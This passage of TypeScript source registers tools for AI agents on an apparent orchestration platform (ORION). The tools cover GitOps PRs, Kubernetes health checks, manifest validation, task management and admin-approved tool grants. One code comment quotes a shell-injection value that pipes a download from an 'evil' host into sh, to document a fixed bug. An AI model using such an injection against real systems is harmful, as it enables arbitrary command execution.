        mergedAt:  result.merged ? new Date() : null,
      },
    }).catch(() => {}) // non-fatal — PR already exists in Gitea even if DB write fails

    await auditLog(ctx.agentId ?? ctx.userId, `🔀 GitOps PR #${result.prNumber} ${action} — **${title}**`)
    const pathSource = liveWatchedPath ? ' (live ArgoCD)' : ' (env config)'
    const conventions = [
      repoPath        ? `Manifest paths must be under: ${repoPath}/${pathSource}` : null,
      vaultPathPrefix ? `Vault secrets must be under: secret/${vaultPathPrefix}/<service>` : null,
    ].filter(Boolean)
    const conventionNote = conventions.length ? `\n\nEnvironment conventions:\n${conventions.map(c => `  • ${c}`).join('\n')}` : ''
    return `PR #${result.prNumber} ${action}. URL: ${result.prUrl}${conventionNote}`
  } catch (e) {
    return `Error proposing GitOps change: ${e instanceof Error ? e.message : String(e)}`
  }
}

registerTool({
  name: 'gitops_ls',
  description: 'List files and directories in the GitOps repo for an environment. Call this BEFORE gitops_propose to check what paths already exist so you place new files consistently with the existing structure. Defaults to the environment\'s watched directory (e.g. "deployments/") — pass a sub-path to drill in (e.g. "deployments/tailscale").',
  inputSchema: {
    type: 'object',
    properties: {
      environment_id: { type: 'string', description: 'Environment ID or name' },
      path:           { type: 'string', description: 'Directory path to list. Omit to list the watched directory root (e.g. "deployments/"). Pass a sub-path to drill in, e.g. "deployments/tailscale".' },
    },
    required: ['environment_id'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'gitops',
  handler: async (args, ctx) => {
    const { environment_id, path: listPath } = args as { environment_id?: string; path?: string }
    if (!environment_id) return 'Error: environment_id is required'

    const env = await ctx.prisma.environment.findFirst({
      where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
    })
    if (!env) return `Error: environment "${environment_id}" not found`
    if (!env.gitOwner || !env.gitRepo) return 'Error: environment has no git repo configured'

    // Live ArgoCD path discovery — prefer cluster truth over DB
    let liveWatchedPath: string | undefined
    try {
      const { customApi } = await import('./k8s')
      const apps = await customApi.listClusterCustomObject('argoproj.io', 'v1alpha1', 'applications')
      const items: any[] = apps?.body?.items ?? []
      const matchingApp = items.find((app: any) => {
        const repoUrl: string = app?.spec?.source?.repoURL ?? ''
        return repoUrl.includes(env.gitRepo!) || repoUrl.endsWith(`/${env.gitRepo}`)
      })
      if (matchingApp?.spec?.source?.path) {
        liveWatchedPath = (matchingApp.spec.source.path as string).replace(/\/$/, '')
      }
    } catch { /* cluster unreachable — fall through */ }

    const repoPath = liveWatchedPath ?? ((env as Record<string, unknown>).repoPath as string | undefined)
    // Default to the watched directory so agents never accidentally browse the repo root
    const effectivePath = listPath || repoPath || ''

    const { listDir } = await import('./gitea')
    const entries = await listDir(env.gitOwner, env.gitRepo, effectivePath)
    if (entries.length === 0) return `No files found at "${effectivePath}"`

    const lines = entries.map(e => `  ${e.type === 'dir' ? '📁' : '📄'} ${e.path}`)
    const source = liveWatchedPath ? ' (live ArgoCD watched path)' : ''
    const header = `Contents of "${effectivePath}"${source} — all manifests must live under this directory:`
    return [header, ...lines].join('\n')
  },
})

async function handleGetClusterApiResources(): Promise<string> {
  try {
    const { customApi } = await import('./k8s')

    const builtins = `Built-in Kubernetes resources (always available):
  v1: ConfigMap, Endpoints, Namespace, Node, PersistentVolume, PersistentVolumeClaim, Pod, Secret, Service, ServiceAccount
  apps/v1: DaemonSet, Deployment, ReplicaSet, StatefulSet
  batch/v1: CronJob, Job
  networking.k8s.io/v1: Ingress, IngressClass, NetworkPolicy
  rbac.authorization.k8s.io/v1: ClusterRole, ClusterRoleBinding, Role, RoleBinding
  storage.k8s.io/v1: StorageClass`

    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const crdRes: any = await customApi.listClusterCustomObject('apiextensions.k8s.io', 'v1', 'customresourcedefinitions')
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const crds: any[] = crdRes?.body?.items ?? crdRes?.items ?? []

    // Group CRDs by API group+version
    const groupMap = new Map<string, string[]>()
    for (const crd of crds) {
      const group = crd.spec?.group ?? ''
      const kinds: string[] = []
      for (const v of (crd.spec?.versions ?? [])) {
        if (v.served) {
          const key = `${group}/${v.name}`
          if (!groupMap.has(key)) groupMap.set(key, [])
          groupMap.get(key)!.push(crd.spec?.names?.kind ?? '')
        }
      }
      void kinds
    }

    let crdLines = ''
    if (groupMap.size === 0) {
      crdLines = '  (none found or cluster unreachable)'
    } else {
      for (const [groupVersion, kinds] of Array.from(groupMap.entries()).sort()) {
        crdLines += `  ${groupVersion}: ${kinds.sort().join(', ')}\n`
      }
      crdLines = crdLines.trimEnd()
    }

    return `Cluster API Resources:\n\n${builtins}\n\nCustom CRDs installed in this cluster:\n${crdLines}\n\nIMPORTANT: Only use apiVersions listed above. Any other apiVersion does not exist and will cause ArgoCD sync failures.`
  } catch (e) {
    return `Error fetching cluster API resources: ${e instanceof Error ? e.message : String(e)}`
  }
}

async function handleValidateManifest(args: unknown): Promise<string> {
  const { files } = parseArgs(args) as {
    files?: Array<{ path: string; content: string }>
  }

  if (!files?.length) return 'Error: files array is required'

  try {
    const { customApi } = await import('./k8s')

    // Fetch installed CRD groups from the cluster
    const installedCrdGroups = new Set<string>()
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const crdRes: any = await customApi.listClusterCustomObject('apiextensions.k8s.io', 'v1', 'customresourcedefinitions')
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const crds: any[] = crdRes?.body?.items ?? crdRes?.items ?? []
      for (const crd of crds) {
        const group = crd.spec?.group ?? ''
        if (group) installedCrdGroups.add(group)
      }
    } catch {
      // Cluster unreachable — we'll still check built-ins
    }

    const builtinGroups = new Set([
      '', 'apps', 'batch', 'networking.k8s.io', 'rbac.authorization.k8s.io',
      'storage.k8s.io', 'policy', 'autoscaling', 'apiextensions.k8s.io',
      'admissionregistration.k8s.io', 'coordination.k8s.io',
    ])

    interface ParsedDoc {
      filePath: string
      apiVersion: string
      kind: string
      group: string
    }

    const docs: ParsedDoc[] = []
    for (const file of files) {
      // Split on YAML document separator
      const parts = file.content.split(/^---\s*$/m).filter(p => p.trim())
      for (const part of parts) {
        const avMatch = part.match(/^apiVersion:\s*(.+)$/m)
        const kindMatch = part.match(/^kind:\s*(.+)$/m)
        if (!avMatch || !kindMatch) continue
        const apiVersion = avMatch[1].trim()
        const kind = kindMatch[1].trim()
        // Extract group from apiVersion (e.g. "apps/v1" → "apps", "v1" → "")
        const slashIdx = apiVersion.lastIndexOf('/')
        const group = slashIdx >= 0 ? apiVersion.slice(0, slashIdx) : ''
        docs.push({ filePath: file.path, apiVersion, kind, group })
      }
    }

    if (docs.length === 0) {
      return 'No parseable Kubernetes documents found in the provided files (missing apiVersion or kind).'
    }

    let passed = 0
    let failed = 0
    const lines: string[] = [`Manifest validation results (${files.length} files, ${docs.length} documents):\n`]

    for (const doc of docs) {
      const isBuiltin = builtinGroups.has(doc.group)
      const isCrd = installedCrdGroups.has(doc.group)
      if (isBuiltin || isCrd) {
        lines.push(`✅ ${doc.apiVersion}/${doc.kind} — ${doc.filePath}`)
        passed++
      } else {
        lines.push(`❌ ${doc.apiVersion}/${doc.kind} — ${doc.filePath}`)
        lines.push(`   CRD group "${doc.group}" is not installed in this cluster.`)
        lines.push(`   Install the required operator first or check the correct apiVersion.`)
        failed++
      }
    }

    lines.push('')
    if (failed === 0) {
      return `✅ All ${passed} documents validated successfully against cluster API resources.\nSafe to call gitops_propose.`
    }

    lines.push(`Summary: ${passed} passed, ${failed} failed`)
    lines.push('❌ DO NOT call gitops_propose until all failures are resolved.')
    return lines.join('\n')
  } catch (e) {
    return `Error validating manifests: ${e instanceof Error ? e.message : String(e)}`
  }
}

async function handleRequestToolGrant(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { tool_name, reason } = parseArgs(args) as {
    tool_name?: string
    reason?: string
  }

  if (!tool_name?.trim()) return 'Error: tool_name is required'
  if (!reason?.trim())    return 'Error: reason is required — explain why this destructive tool is needed'

  const actorId = ctx.agentId ?? ctx.userId
  if (!actorId) return 'Error: actorId is required to request a tool grant (SOC2 attribution)'

  // Resolve environmentId from agent link
  let resolvedEnvId = ctx.environmentId ?? null
  if (!resolvedEnvId && ctx.agentId) {
    const envLink = await ctx.prisma.agentEnvironment.findFirst({
      where:  { agentId: ctx.agentId },
      select: { environmentId: true },
    })
    resolvedEnvId = envLink?.environmentId ?? null
  }

  if (!resolvedEnvId) return 'Error: no environment linked to this agent — cannot create a tool grant request'

  // De-duplicate: only create one pending request per (agent, tool)
  const existing = await ctx.prisma.toolApprovalRequest.findFirst({
    where: {
      userId:        actorId,
      environmentId: resolvedEnvId,
      toolName:      tool_name.trim(),
      status:        'pending',
    },
  })

  if (existing) {
    return `A pending grant request for \`${tool_name.trim()}\` already exists (id: ${existing.id}). An admin must approve it before you can use this tool.`
  }

  const request = await ctx.prisma.toolApprovalRequest.create({
    data: {
      conversationId: `task-agent:${actorId}`,
      userId:         actorId,
      environmentId:  resolvedEnvId,
      toolName:       tool_name.trim(),
      reason:         reason.trim(),
    },
  })

  const msg = `🔒 Tool grant requested: **${tool_name.trim()}** — ${reason.trim().slice(0, 200)}`
  await auditLog(actorId, msg)

  return `Grant request submitted (id: ${request.id}) for \`${tool_name.trim()}\`. An admin must approve this request in the ORION UI (Administration → Approvals) before you can call this tool. Reason recorded: ${reason.trim()}`
}

// ── Cluster health handler ────────────────────────────────────────────────────

interface IngressEntry { namespace: string; ingress: string; host: string }
interface HealthResult extends IngressEntry {
  status: 'healthy' | 'degraded'
  httpStatus: number
  sslValid: boolean
  sslDaysUntilExpiry: number
  issues: string[]
  taskKey: string
}

function checkSSLCert(hostname: string): Promise<{ valid: boolean; daysUntilExpiry: number; error?: string }> {
  return new Promise((resolve) => {
    const socket = tls.connect(443, hostname, { servername: hostname }, () => {
      const cert = socket.getPeerCertificate()
      if (!cert?.valid_to) {
        socket.destroy()
        return resolve({ valid: false, daysUntilExpiry: 0, error: 'no certificate returned' })
      }
      const daysUntilExpiry = Math.floor((new Date(cert.valid_to).getTime() - Date.now()) / 86_400_000)
      socket.destroy()
      resolve({ valid: true, daysUntilExpiry })
    })
    socket.setTimeout(6_000, () => { socket.destroy(); resolve({ valid: false, daysUntilExpiry: 0, error: 'timeout' }) })
    socket.on('error', (e: NodeJS.ErrnoException) => {
      const msg = e.code === 'CERT_HAS_EXPIRED'             ? 'certificate expired'
                : e.code === 'DEPTH_ZERO_SELF_SIGNED_CERT'  ? 'self-signed certificate'
                : e.code === 'ERR_TLS_CERT_ALTNAME_INVALID' ? 'hostname mismatch'
                : e.message
      resolve({ valid: false, daysUntilExpiry: 0, error: msg })
    })
  })
}

function checkHTTPReachability(hostname: string): Promise<{ statusCode: number; reachable: boolean; error?: string }> {
  return new Promise((resolve) => {
    const req = https.get(
      `https://${hostname}`,
      { timeout: 8_000, headers: { 'User-Agent': 'ORION-HealthCheck/1.0' } },
      (res) => {
        const statusCode = res.statusCode ?? 0
        resolve({ statusCode, reachable: statusCode > 0 && statusCode < 500 })
        res.destroy()
      },
    )
    req.on('timeout', () => { req.destroy(); resolve({ statusCode: 0, reachable: false, error: 'timeout' }) })
    req.on('error', (e: NodeJS.ErrnoException) => {
      const isCertError = !!(e.code?.startsWith('CERT_') || e.code?.startsWith('ERR_TLS') || e.code === 'DEPTH_ZERO_SELF_SIGNED_CERT')
      resolve({ statusCode: 0, reachable: isCertError, error: e.message })
    })
  })
}

function checkGatewayReachability(rawUrl: string): Promise<{ reachable: boolean; statusCode: number; error?: string }> {
  return new Promise((resolve) => {
    let parsed: URL
    try { parsed = new URL(rawUrl) }
    catch { return resolve({ reachable: false, statusCode: 0, error: 'invalid URL' }) }

    const requester = parsed.protocol === 'https:' ? https : http
    const req = requester.get(rawUrl, { timeout: 8_000 }, (res) => {
      res.resume()
      resolve({ reachable: true, statusCode: res.statusCode ?? 0 })
    })
    req.on('timeout', () => { req.destroy(); resolve({ reachable: false, statusCode: 0, error: 'timeout' }) })
    req.on('error',   (e) => resolve({ reachable: false, statusCode: 0, error: e.message }))
  })
}

async function handleClusterHealth(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { namespace } = parseArgs(args) as { namespace?: string }

  const clusterIssues: HealthResult[] = []
  const errors: string[] = []

  const ingressRoutes = await ctx.prisma.ingressRoute.findMany({
    where:  { enabled: true },
    select: { host: true, tls: true, ingressPoint: { select: { name: true, domain: { select: { name: true } } } } },
  })

  const seenHosts = new Set<string>()
  const uniqueRoutes = ingressRoutes.filter((r) => {
    if (seenHosts.has(r.host)) return false
    seenHosts.add(r.host)
    return true
  })

  const envs = await ctx.prisma.environment.findMany({
    where:  { type: 'cluster', kubeconfig: { not: null } },
    select: { id: true, name: true, kubeconfig: true },
  })

  for (const env of envs) {
    let kubeconfigPath: string | null = null
    try {
      const decoded = Buffer.from(env.kubeconfig!, 'base64').toString('utf-8')
      kubeconfigPath = join(tmpdir(), `orion-health-${env.id}.yaml`)
      writeFileSync(kubeconfigPath, decoded, { mode: 0o600 })
      // BLOCKER fix: `namespace` arg was interpolated into exec() template string → shell injection.
      // A namespace value like `; curl http://evil | sh #` ran arbitrary commands.
      // Switch to execFile (no shell) with args as an array.
      const { execFile: execFileCb } = await import('child_process')
      const execFileAsync = (cmd: string, args: string[], opts: { timeout: number }) =>
        new Promise<{ stdout: string }>((res, rej) =>
          execFileCb(cmd, args, { ...opts, encoding: 'utf8' }, (err, stdout) =>
            err ? rej(err) : res({ stdout: stdout as string })
          )
        )
      // Validate namespace is a safe K8s label (DNS subdomain + dots)
      const safeNs = namespace && /^[a-z0-9][a-z0-9.-]{0,251}[a-z0-9]$/.test(namespace) ? namespace : null
      const baseArgs = ['--kubeconfig', kubeconfigPath!, '-o', 'json']
      const nsArgs   = safeNs ? ['-n', safeNs] : ['-A']

      const [nodesOut, podsOut] = await Promise.all([
        execFileAsync('kubectl', ['get', 'nodes', ...baseArgs],         { timeout: 15_000 }).catch(() => null),
        execFileAsync('kubectl', ['get', 'pods', ...nsArgs, ...baseArgs], { timeout: 20_000 }).catch(() => null),
      ])

      if (nodesOut) {
        const nodesData = JSON.parse(nodesOut.stdout) as { items: any[] }
        for (const node of nodesData.items) {
          const readyCond = node.status?.conditions?.find((c: any) => c.type === 'Ready')
          if (readyCond?.status !== 'True') {
            const reason = readyCond?.reason ?? readyCond?.message ?? 'Unknown'
            clusterIssues.push({
              namespace:          env.name,
              ingress:            'node',
              host:               `node/${node.metadata.name as string}`,
              status:             'degraded',
              httpStatus:         0,
              sslValid:           true,
              sslDaysUntilExpiry: 999,
              issues:             [`node NotReady — ${reason}`],
              taskKey:            `pulse:node:${node.metadata.name as string}`,
            })
          }
        }
      }

      if (podsOut) {
        const podsData = JSON.parse(podsOut.stdout) as { items: any[] }
        for (const pod of podsData.items) {
          const phase = pod.status?.phase as string | undefined
          if (phase === 'Succeeded') continue
          const podIssues: string[] = []
          if (phase === 'Pending') {
            const condition = pod.status?.conditions?.find((c: any) => c.type === 'PodScheduled' && c.status !== 'True')
            podIssues.push(`Pending${condition ? ` — ${condition.reason as string}` : ''}`)
          } else if (phase === 'Failed') {
            podIssues.push(`Failed — ${pod.status?.reason ?? pod.status?.message ?? 'unknown'}`)
          } else if (phase === 'Running' || !phase) {
            for (const cs of (pod.status?.containerStatuses ?? []) as any[]) {
              const waiting = cs.state?.waiting
              if (waiting?.reason === 'CrashLoopBackOff') {
                podIssues.push(`CrashLoopBackOff — ${cs.name as string} (${cs.restartCount as number} restarts)`)
              } else if (waiting?.reason === 'OOMKilled' || cs.lastState?.terminated?.reason === 'OOMKilled') {
                podIssues.push(`OOMKilled — ${cs.name as string}`)
              } else if (!cs.ready && !waiting?.reason) {
                podIssues.push(`container not ready — ${cs.name as string}`)
              }
            }
          }
          if (podIssues.length > 0) {
            clusterIssues.push({
              namespace:          `${env.name}/${pod.metadata.namespace as string}`,
              ingress:            'pod',
              host:               `pod/${pod.metadata.name as string}`,
              status:             'degraded',
              httpStatus:         0,
              sslValid:           true,
              sslDaysUntilExpiry: 999,
              issues:             podIssues,
              taskKey:            `pulse:pod:${pod.metadata.namespace as string}/${pod.metadata.name as string}`,
            })
          }
        }
      }
    } catch (e) {
      errors.push(`${env.name}: ${e instanceof Error ? e.message : String(e)}`)
    } finally {
      if (kubeconfigPath) try { unlinkSync(kubeconfigPath) } catch { /* ignore */ }
    }
  }

  const results: HealthResult[] = await Promise.all(
    uniqueRoutes.map(async (route) => {
      const label = route.ingressPoint?.domain?.name ?? route.ingressPoint?.name ?? 'ingress'
      const [httpCheck, ssl] = await Promise.all([
        checkHTTPReachability(route.host),
        route.tls ? checkSSLCert(route.host) : Promise.resolve({ valid: true, daysUntilExpiry: 999 }),
      ])

      const issues: string[] = []
      if (!httpCheck.reachable)           issues.push(`unreachable — ${httpCheck.error ?? `HTTP ${httpCheck.statusCode}`}`)
      if (route.tls) {
        if (!ssl.valid)                     issues.push(`invalid SSL cert — ${(ssl as any).error ?? 'certificate not trusted'}`)
        else if (ssl.daysUntilExpiry <= 0)  issues.push('SSL cert expired')
        else if (ssl.daysUntilExpiry < 30)  issues.push(`SSL cert expires in ${ssl.daysUntilExpiry} days`)
      }

      return {
        namespace:          label,
        ingress:            route.ingressPoint?.name ?? 'unknown',
        host:               route.host,
        status:             issues.length === 0 ? 'healthy' : 'degraded',
        httpStatus:         httpCheck.statusCode,
        sslValid:           ssl.valid,
        sslDaysUntilExpiry: ssl.daysUntilExpiry,
        issues,
        taskKey:            `pulse:host:${route.host}`,
      } as HealthResult
    })
  )

  results.push(...clusterIssues)

  const allEnvsWithGateway = await ctx.prisma.environment.findMany({
    where:  { gatewayUrl: { not: null } },
    select: { id: true, name: true, type: true, gatewayUrl: true },
  })

  for (const env of allEnvsWithGateway) {
    try {
      const reach = await checkGatewayReachability(env.gatewayUrl!)
      const issues: string[] = []
      if (!reach.reachable) issues.push(`gateway unreachable — ${reach.error ?? `HTTP ${reach.statusCode}`}`)
      results.push({
        namespace:          `gateway/${env.type}`,
        ingress:            env.name,
        host:               env.gatewayUrl!,
        status:             issues.length === 0 ? 'healthy' : 'degraded',
        httpStatus:         reach.statusCode,
        sslValid:           true,
        sslDaysUntilExpiry: 999,
        issues,
        taskKey:            `pulse:gateway:${env.name.toLowerCase().replace(/\s+/g, '-')}`,
      } as HealthResult)
    } catch (e) {
      errors.push(`${env.name} gateway: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  const systemServiceSettings = await ctx.prisma.systemSetting.findMany({
    where: { key: { startsWith: 'system.service.' } },
  })
  for (const setting of systemServiceSettings) {
    const url = typeof setting.value === 'string' ? setting.value : null
    if (!url) continue
    const label = setting.key.replace('system.service.', '')
    try {
      const reach = await checkGatewayReachability(url)
      const issues: string[] = []
      if (!reach.reachable) issues.push(`unreachable — ${reach.error ?? `HTTP ${reach.statusCode}`}`)
      results.push({
        namespace:          'orion-system',
        ingress:            label,
        host:               url,
        status:             issues.length === 0 ? 'healthy' : 'degraded',
        httpStatus:         reach.statusCode,
        sslValid:           true,
        sslDaysUntilExpiry: 999,
        issues,
        taskKey:            `pulse:svc:${label}`,
      } as HealthResult)
    } catch (e) {
      errors.push(`${label}: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  const degraded = results.filter((r) => r.status === 'degraded')
  return JSON.stringify({
    summary: { total: results.length, healthy: results.length - degraded.length, degraded: degraded.length },
    degraded,
    all: results,
    ...(errors.length > 0 && { errors }),
  }, null, 2)
}

// ── Register all tools ────────────────────────────────────────────────────────

registerTool({
  name: 'orion_list_agents',
  description: 'List all agents on the team — their IDs, names, roles, and current busy/available status. Use this to see who is available before assigning work or creating new agents.',
  inputSchema: {
    type: 'object',
    properties: {
      include_archived: { type: 'boolean', description: 'Include archived agents (default false)' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'agents',
  handler: handleListAgents,
})

registerTool({
  name: 'orion_list_tasks',
  description: 'List tasks filtered by status, assignment, and date. Use this to find unassigned work, check what is running, or review failed tasks.',
  inputSchema: {
    type: 'object',
    properties: {
      status:          { type: 'string',  description: 'Filter by status: pending, running, pending_validation, done, failed. Defaults to pending+running+failed. Use "pending_validation" to find tasks awaiting Veritas review.' },
      unassigned_only: { type: 'boolean', description: 'Only return tasks with no agent or user assigned (default false)' },
      assigned_agent_id: { type: 'string', description: 'Filter to tasks assigned to a specific agent ID' },
      since:           { type: 'string',  description: 'ISO 8601 timestamp — only return tasks created or updated after this date. Use this to fetch only new work since your last review.' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'tasks',
  handler: handleListTasks,
})

registerTool({
  name: 'orion_assign_task',
  description: 'Assign a pending task to an agent. Sets the task status to pending and records the agent assignment.',
  inputSchema: {
    type: 'object',
    properties: {
      task_id:  { type: 'string', description: 'Task ID to assign' },
      agent_id: { type: 'string', description: 'Agent ID to assign the task to' },
    },
    required: ['task_id', 'agent_id'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tasks',
  handler: handleAssignTask,
})

registerTool({
  name: 'orion_create_agent',
  description: 'Create a new agent. Use only when no existing agent is suitable for the required work.',
  inputSchema: {
    type: 'object',
    properties: {
      name:         { type: 'string', description: 'Unique agent name (cannot be a reserved name: human, user, system, admin)' },
      role:         { type: 'string', description: 'One-line role description' },
      systemPrompt: { type: 'string', description: 'REQUIRED — full system prompt defining the agent\'s personality, responsibilities, and operating rules. Must be specific and actionable.' },
      type:         { type: 'string', description: 'Agent type for AI agents (default: claude). Do NOT use "human" — that is reserved for human users.' },
      description:  { type: 'string', description: 'Optional longer description' },
      persistent:   { type: 'boolean', description: 'true = persistent agent that stays in the roster; false = transient, will be archived when its work is done (default: false)' },
      llm:          { type: 'string', description: 'LLM to use (e.g. ext:<id>). Omit to use the system default.' },
    },
    required: ['name', 'role', 'systemPrompt'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'agents',
  handler: handleCreateAgent,
})

registerTool({
  name: 'orion_update_agent',
  description: 'Update an existing agent\'s role, description, system prompt, LLM, or review timestamp. Use this to improve agents based on observed performance — sharpen their prompts, fix their role description, or reassign their LLM. Also call this with mentorReviewedAt to record that you have reviewed an agent even if no prompt change was needed.',
  inputSchema: {
    type: 'object',
    properties: {
      agent_id:          { type: 'string', description: 'Agent ID to update' },
      role:              { type: 'string', description: 'Updated one-line role description' },
      description:       { type: 'string', description: 'Updated longer description' },
      systemPrompt:      { type: 'string', description: 'Updated full system prompt' },
      llm:               { type: 'string', description: 'Updated LLM (e.g. ext:<id>)' },
      mentorReviewedAt:  { type: 'string', description: 'ISO 8601 timestamp to record when Mentor last reviewed this agent. Always set this after completing a review, even if no changes were made.' },
    },
    required: ['agent_id'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'agents',
  handler: handleUpdateAgent,
})

registerTool({
  name: 'orion_archive_agent',
  description: 'Soft-archive a transient agent after its work is done. Never deletes — preserves audit trail (SOC2 [A-001]).',
  inputSchema: {
    type: 'object',
    properties: {
      agent_id: { type: 'string', description: 'Agent ID to archive' },
      reason:   { type: 'string', description: 'Optional reason for archiving' },
    },
    required: ['agent_id'],
  },
  tier: 'destructive',
  parallelSafe: false,
  availableIn: 'both',
  category: 'agents',
  handler: handleArchiveAgent,
})

registerTool({
  name: 'orion_escalate_task',
  description: 'Escalate a task to a human user. Sets the assignedUserId and status to pending.',
  inputSchema: {
    type: 'object',
    properties: {
      task_id: { type: 'string', description: 'Task ID to escalate' },
      user_id: { type: 'string', description: 'User ID to assign the task to' },
    },
    required: ['task_id', 'user_id'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tasks',
  handler: handleEscalateTask,
})

registerTool({
  name: 'orion_get_task_events',
  description: 'Fetch the execution event log for a task. Returns timestamped events including tool calls, tool results, and agent output. Use this to verify whether a task was actually executed before closing it.',
  inputSchema: {
    type: 'object',
    properties: {
      task_id: { type: 'string', description: 'Task ID to fetch events for' },
      limit:   { type: 'number', description: 'Maximum number of events to return (default 50)' },
    },
    required: ['task_id'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'tasks',
  handler: handleGetTaskEvents,
})

registerTool({
  name: 'orion_close_task',
  description: 'Mark a task as done after confirming the work was actually completed. Only works on tasks in pending_validation status. ONLY call this after verifying via orion_get_task_events that real tool calls were made and the outcome matches the task description.',
  inputSchema: {
    type: 'object',
    properties: {
      task_id: { type: 'string', description: 'Task ID to close' },
      summary: { type: 'string', description: 'Brief validation summary — what was confirmed and how' },
    },
    required: ['task_id', 'summary'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tasks',
  handler: handleCloseTask,
})

registerTool({
  name: 'orion_reopen_task',
  description: 'Reopen a pending_validation task back to pending. Use when validation reveals the task was not actually completed — e.g. agent self-reported done with zero tool calls.',
  inputSchema: {
    type: 'object',
    properties: {
      task_id: { type: 'string', description: 'Task ID to reopen' },
      reason:  { type: 'string', description: 'Why the task is being reopened' },
    },
    required: ['task_id', 'reason'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tasks',
  handler: handleReopenTask,
})

registerTool({
  name: 'orion_list_rooms',
  description: 'List chat rooms. Optionally filter by feature_id to find the coordination room for a feature.',
  inputSchema: {
    type: 'object',
    properties: {
      feature_id: { type: 'string', description: 'Filter by feature ID to find the feature coordination room' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'rooms',
  handler: handleListRooms,
})

registerTool({
  name: 'orion_send_message',
  description: 'Post a message to a chat room. Use this to communicate with other agents or report status in a feature coordination room.',
  inputSchema: {
    type: 'object',
    properties: {
      room_id: { type: 'string', description: 'Chat room ID to post the message to' },
      content: { type: 'string', description: 'Message content to post' },
    },
    required: ['room_id', 'content'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'rooms',
  handler: handleSendMessage,
})

registerTool({
  name: 'orion_set_goal',
  description: 'Set an active goal for a chat room. While a goal is active, agents in the room must respond with progress rather than going silent. Use this when you want an agent to keep working until a task is explicitly done.',
  inputSchema: {
    type: 'object',
    properties: {
      room_id: { type: 'string', description: 'Chat room ID to set the goal in' },
      goal:    { type: 'string', description: 'Clear description of what must be accomplished' },
    },
    required: ['room_id', 'goal'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'rooms',
  handler: handleSetGoal,
})

registerTool({
  name: 'orion_complete_goal',
  description: 'Mark the active goal in a chat room as complete and clear it. GUARD: Only call this after you have VERIFIED the goal is actually done — check pod status, test endpoints, confirm resources are healthy. Do NOT call this just because a PR was merged, a command was issued, or you believe the work should be done. You must have observed real evidence of success (e.g. kubectl_get_pods showing Running, HTTP 200 from the endpoint). Provide a verification_summary describing exactly what you checked.',
  inputSchema: {
    type: 'object',
    properties: {
      room_id:              { type: 'string', description: 'Chat room ID to clear the goal from' },
      verification_summary: { type: 'string', description: 'What you actually checked to confirm the goal is complete. E.g. "kubectl_get_pods shows all 7 arr-stack pods Running; curl sonarr.khalisio.com returns 200". Required — vague answers will be rejected.' },
    },
    required: ['room_id', 'verification_summary'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'rooms',
  handler: handleCompleteGoal,
})

registerTool({
  name: 'orion_create_feature',
  description: 'Create a new feature under an epic. GUARD: will fail if epic.plan is null — the epic must have a saved plan before features can be created.',
  inputSchema: {
    type: 'object',
    properties: {
      epicId:      { type: 'string', description: 'ID of the parent epic' },
      title:       { type: 'string', description: 'Feature title' },
      description: { type: 'string', description: 'Feature description (optional)' },
    },
    required: ['epicId', 'title'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'features',
  handler: handleCreateFeature,
})

registerTool({
  name: 'orion_create_task',
  description: 'Create a new task under a feature with a step-by-step implementation plan. The plan should be numbered steps specific enough for a smaller LLM to execute without additional context. GUARD: will fail if feature.plan is null.',
  inputSchema: {
    type: 'object',
    properties: {
      featureId:         { type: 'string', description: 'ID of the parent feature' },
      title:             { type: 'string', description: 'Task title' },
      description:       { type: 'string', description: 'Task description (optional)' },
      plan:              { type: 'string', description: 'Numbered step-by-step implementation plan. Each step should be specific enough for a smaller LLM to execute. E.g.:\n1. Read /path/to/file and understand X\n2. Edit Y to add Z\n3. Run the test suite\n4. Verify output matches expected' },
      targetEnvironment: {
        type: 'object',
        description: 'For deployment tasks — the target environment as designated by the Atlas. Pass as an object with keys: namespace (e.g. "apps"), hostname (e.g. "myapp.khalisio.com"), storageClass (e.g. "longhorn", if storage needed), vaultPath (e.g. "secret/data/myapp", if secrets needed).',
      },
      dedup_key: {
        type: 'string',
        description: 'Optional deduplication key. If an open task (pending/running/pending_validation) with this exact key already exists under the same feature, creation is skipped and the existing task is returned. Use a stable identifier like "pulse:host:vault-proxy" or "pulse:node:talos-rpi2".',
      },
    },
    required: ['featureId', 'title', 'plan'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tasks',
  handler: handleCreateTask,
})

// orion_propose_gitops removed — use gitops_propose (the canonical tool with path normalization and guard)

registerTool({
  name: 'get_cluster_api_resources',
  description: 'List all API resources available in the cluster — built-in Kubernetes resource types plus all installed CRDs. Use this before writing manifests to verify that the apiVersions and kinds you plan to use actually exist. Prevents ArgoCD sync failures caused by referencing non-existent CRDs.',
  inputSchema: {
    type: 'object',
    properties: {},
    required: [],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'gitops',
  handler: () => handleGetClusterApiResources(),
})

registerTool({
  name: 'validate_manifest',
